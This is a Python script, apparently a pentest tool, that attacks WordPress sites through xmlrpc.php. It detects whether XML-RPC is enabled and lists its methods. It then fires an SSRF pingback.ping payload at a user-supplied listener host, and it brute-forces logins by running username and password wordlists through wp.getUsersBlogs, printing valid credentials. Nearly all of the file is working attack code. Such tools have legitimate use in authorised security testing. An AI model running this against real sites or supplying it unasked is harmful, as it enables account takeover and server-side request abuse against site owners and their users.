#!/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class xmlrpc:
    def __init__(self, url):
        self.url = url

    def islive(self):
        url = self.url
        response = requests.get(url, verify=False)
       
        if response.status_code == 200:
            return True
        else:
            return False

    def listavailable(self, furl):
                
        xmlmsg = """
        <methodCall>
        <methodName>system.listMethods</methodName>
        <params></params>
        </methodCall>
        """
        header = {"Content-Type": "text/xml"}
        response = requests.post(furl, headers=header, data=xmlmsg, verify=False)
        return response.text
        
    
    def ssrf(self, xmlresponse):
        soup = BeautifulSoup(xmlresponse, 'lxml-xml')
        ssrf = False
        for name in soup.find_all('string'):
            if "pingback.ping" in name.text.strip():
                ssrf = True
                print("[INFO] SSRF option seems active")
        if not ssrf:
            print("[INFO] SSRF option is not active")
            print(xmlresponse)
        else:
            ask = input("[ASK] Found SSRF option enabled. Do you want to test for it ? [y/n]: ")
            if ask == 'y' or ask == 'Y':
                furl = self.url + '/xmlrpc.php'
                pars = urlparse(furl)
                listner = input("[ASK] Enter the burp colaborator link. ex- listner.com: ")
                print("[INFO] Testing SSRF....")
                hostBlog = "https://" + pars.netloc + '/?p=1'
                payload = f"""
                <methodCall>
                    <methodName>pingback.ping</methodName>
                    <params>
                        <param>
                            <value>
                                <string>http://{listner}:80/</string>
                            </value>
                        </param>
                        <param>
                            <value>
                                <string>{hostBlog}</string>
                            </value>
                        </param>
                    </params>
                </methodCall>"""

                response = requests.post(furl, data=payload, verify=False)
                #print(response.text)
                print("[INFO] SSRF request sent")
                print("[CHECK] Check you colaborator instance for any activity logs")
                
            elif ask == 'n' or ask == 'N':
                pass
            else:
                print(f"[ABORT] Got {ask} as input when only [y/n] is accepted. ABORTING SSRF TESTING !!!")
    
    def brute(self, xmlresponse):
        ask = input("[ASK] BruteForce options is also active. Do you want to start brute force attack [y/n]: ")
        if ask == 'y' or ask == 'Y':
            user = input("[INPUT] Enter the path to username wordlist: ")
            passw = input("[INPUT] Enter the path to passwords wordlist: ")
            userfile = open(user, 'r')
            for usernames in userfile.readlines():     
                found = False
                passfile = open(passw, 'r')  
                for passwords in passfile.readlines():
                    username = ''.join(usernames.split())
                    password = ''.join(passwords.split())                
                    xmlburtdata = f"""
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{username}</value></param>
                            <param><value>{password}</value></param>
                        </params>
                    </methodCall>
                    """
                    print(f"[INFO] Trying  {username} : {password}")
                    response = requests.post(self.url + '/xmlrpc.php', data = xmlburtdata, verify=False)
                    if "Incorrect username or password." not in response.text:
                        print(f"[FOUND] {username} : {password} is VALID!!")
                        found = True
                        break
                if found:
                    break
            userfile.close()
            passfile.close()

    def scan(self):
        if self.islive():
            
            furl = self.url + '/xmlrpc.php'
            response = requests.get(furl, verify=False)
            
            msg = "XML-RPC server accepts POST requests only."
            
            if msg in response.text and response.status_code == 405:
                print(f"[INFO] XMLRPC is enable on {self.url}")
                xmlresponse = self.listavailable(furl)
                self.ssrf(xmlresponse)
                self.brute(xmlresponse)
            else:
                print(f"[INFO] XMLRPC not detected")
            

